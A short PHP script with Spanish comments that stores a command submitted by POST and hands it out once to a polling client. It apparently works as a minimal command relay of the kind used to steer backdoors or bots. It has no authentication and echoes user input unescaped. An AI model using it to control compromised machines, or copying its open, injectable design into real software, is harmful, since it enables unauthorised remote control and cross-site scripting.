<?php
// Archivo: obtener_comando.php

// Definir un archivo de texto para almacenar el comando
$archivo_comando = 'comando.txt';

// Verificar si se envió un comando por POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comando'])) {
    // Guardar el comando en el archivo
    file_put_contents($archivo_comando, $_POST['comando']);
    echo "Comando guardado: " . $_POST['comando'];
    exit;
}

// Leer el comando del archivo
if (file_exists($archivo_comando)) {
    $comando = file_get_contents($archivo_comando);
    
    // Borrar el archivo después de leer el comando
    unlink($archivo_comando);
    
    echo $comando;
} else {
    echo "NO_COMANDO";
}
?>